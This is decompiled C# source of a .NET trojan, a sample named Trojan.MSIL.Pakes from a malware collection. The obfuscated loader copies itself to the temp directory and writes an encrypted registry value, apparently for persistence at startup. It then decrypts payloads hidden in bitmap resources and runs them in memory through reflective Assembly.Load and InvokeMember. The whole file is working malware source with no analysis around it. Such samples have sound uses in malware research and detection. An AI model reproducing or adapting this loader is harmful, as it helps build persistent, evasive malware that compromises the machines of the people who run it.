// Decompiled with JetBrains decompiler
// Type: gZyQgvIuiwnkbwcosoPFhOUHu
// Assembly: udpate4crypt, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 541DEA59-E19A-477D-AB3D-3DB3AA857568
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.MSIL.Pakes.ap-f4471ee56906b80e4b69c7226be029e97a72b82baf0a9ad0f294d21342e36f9a.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class gZyQgvIuiwnkbwcosoPFhOUHu
{
  private static string ÌèJ8ûùdcÄÍFÞþAÃrÑtf4ßçEìp = Path.GetTempPath();

  [DllImport("Shell32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int ShellExecuteA(
    IntPtr Parent,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string OperationType,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string FileLocation,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string Parameters,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string StartDirectory,
    int ShowType);

  [STAThread]
  public static void Main()
  {
    string str1 = gZyQgvIuiwnkbwcosoPFhOUHu.ÌèJ8ûùdcÄÍFÞþAÃrÑtf4ßçEìp + Path.GetFileName(Application.ExecutablePath);
    if (!File.Exists(str1))
      MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, str1, true);
    Registry.CurrentUser.OpenSubKey(gÑøçoGñðÝ6ÙÛïàÇNÌwÒËê5ÎÕÍ.TrGFrÒodäñÄTâåçÐüjÑÇâÞõØf("v/68Y/qkJeaS4eDWlF0SbJDFZRIySMJYjAm0AG3+medFAIXZ1ITzRIYCOyMX1R7k", "RKÞSÞSWVðxÞ1PhOõøÒLQÊaþéÅ"), true).SetValue(gÑøçoGñðÝ6ÙÛïàÇNÌwÒËê5ÎÕÍ.TrGFrÒodäñÄTâåçÐüjÑÇâÞõØf("v0LxWsGXUlRG60QRoscrAQ==", "RKÞSÞSWVðxÞ1PhOõøÒLQÊaþéÅ"), (object) str1, RegistryValueKind.String);
    ResourceManager resourceManager = new ResourceManager(gÑøçoGñðÝ6ÙÛïàÇNÌwÒËê5ÎÕÍ.TrGFrÒodäñÄTâåçÐüjÑÇâÞõØf("SVMNNa5JffQB6QfHfch/EssaiM+Y58r3SHhA4mm7808=", "RKÞSÞSWVðxÞ1PhOõøÒLQÊaþéÅ"), Assembly.GetExecutingAssembly());
    string str2 = Conversions.ToString(resourceManager.GetObject(gÑøçoGñðÝ6ÙÛïàÇNÌwÒËê5ÎÕÍ.TrGFrÒodäñÄTâåçÐüjÑÇâÞõØf("PjM9rTCOv6/wPdntEYSAw/SARcL/AtIw7ceDd1BVQKY=", "RKÞSÞSWVðxÞ1PhOõøÒLQÊaþéÅ")));
    byte[] numArray = FxSÙÉÚßsÞÝWÆCipgùÔOßråÞÒg.LlþmQÎ5äìðöNè6ôÌBJäéõ5yCÓ(èóÒÒÆsÝnËÓPÛ8ÏT9DÚÖïàsaáf.ÏlìAhígr8ÁBÌðæbÐèØÇÀöe7Ïï((Bitmap) resourceManager.GetObject(gÑøçoGñðÝ6ÙÛïàÇNÌwÒËê5ÎÕÍ.TrGFrÒodäñÄTâåçÐüjÑÇâÞõØf("QsqlNwxm0pr/yLbIttkT6SE64MMlq3ThA5oEyMM87CE=", "RKÞSÞSWVðxÞ1PhOõøÒLQÊaþéÅ")), str2), str2);
    byte[] ôPi8àÌélê7À7céùSÈÓðÓsäð3Á = FxSÙÉÚßsÞÝWÆCipgùÔOßråÞÒg.LlþmQÎ5äìðöNè6ôÌBJäéõ5yCÓ(èóÒÒÆsÝnËÓPÛ8ÏT9DÚÖïàsaáf.ÏlìAhígr8ÁBÌðæbÐèØÇÀöe7Ïï((Bitmap) resourceManager.GetObject(gÑøçoGñðÝ6ÙÛïàÇNÌwÒËê5ÎÕÍ.TrGFrÒodäñÄTâåçÐüjÑÇâÞõØf("8raMKXPkQr6UWqQ2+wRTIGesLBIHrpC5+/kdT293+pU=", "RKÞSÞSWVðxÞ1PhOõøÒLQÊaþéÅ")), str2), str2);
    object[] hÈÒÁíÎNDySFnÝzìî9æYpTÍðùÃ = new object[3]
    {
      (object) numArray,
      (object) true,
      (object) "nothing"
    };
    gZyQgvIuiwnkbwcosoPFhOUHu.FpgØVóqvïYðøàÅÂHjÕgçÐÃßAÊ((object) ôPi8àÌélê7À7céùSÈÓðÓsäð3Á, gÑøçoGñðÝ6ÙÛïàÇNÌwÒËê5ÎÕÍ.TrGFrÒodäñÄTâåçÐüjÑÇâÞõØf("m76OjKYMBus=", "RKÞSÞSWVðxÞ1PhOõøÒLQÊaþéÅ"), gÑøçoGñðÝ6ÙÛïàÇNÌwÒËê5ÎÕÍ.TrGFrÒodäñÄTâåçÐüjÑÇâÞõØf("k1fBXnzAnwo=", "RKÞSÞSWVðxÞ1PhOõøÒLQÊaþéÅ"), gÑøçoGñðÝ6ÙÛïàÇNÌwÒËê5ÎÕÍ.TrGFrÒodäñÄTâåçÐüjÑÇâÞõØf("KNt/euSAGWQ=", "RKÞSÞSWVðxÞ1PhOõøÒLQÊaþéÅ"), hÈÒÁíÎNDySFnÝzìî9æYpTÍðùÃ);
  }

  public static void FpgØVóqvïYðøàÅÂHjÕgçÐÃßAÊ(
    object ôPi8àÌélê7À7céùSÈÓðÓsäð3Á,
    string XìrëjÐ1ùSÀjû3RUØÎãüruÑüCF,
    string LÏßv6GdeÆyßnÃwqyC9eÊWÅsÐû,
    string è0óË6ÏîeÛN1VyMk6ÐvÝzZAbÅö,
    object[] hÈÒÁíÎNDySFnÝzìî9æYpTÍðùÃ)
  {
    System.Type Type = typeof (Assembly);
    object[] objArray = new object[1]
    {
      RuntimeHelpers.GetObjectValue(ôPi8àÌélê7À7céùSÈÓðÓsäð3Á)
    };
    object[] Arguments = objArray;
    bool[] flagArray = new bool[1]{ true };
    bool[] CopyBack = flagArray;
    NewLateBinding.LateGet((object) null, Type, "Load", Arguments, (string[]) null, (System.Type[]) null, CopyBack);
    if (flagArray[0])
      ôPi8àÌélê7À7céùSÈÓðÓsäð3Á = RuntimeHelpers.GetObjectValue(objArray[0]);
    object obj;
    obj.GetType().InvokeMember(è0óË6ÏîeÛN1VyMk6ÐvÝzZAbÅö, BindingFlags.InvokeMethod, (Binder) null, RuntimeHelpers.GetObjectValue(obj), hÈÒÁíÎNDySFnÝzìî9æYpTÍðùÃ);
  }
}
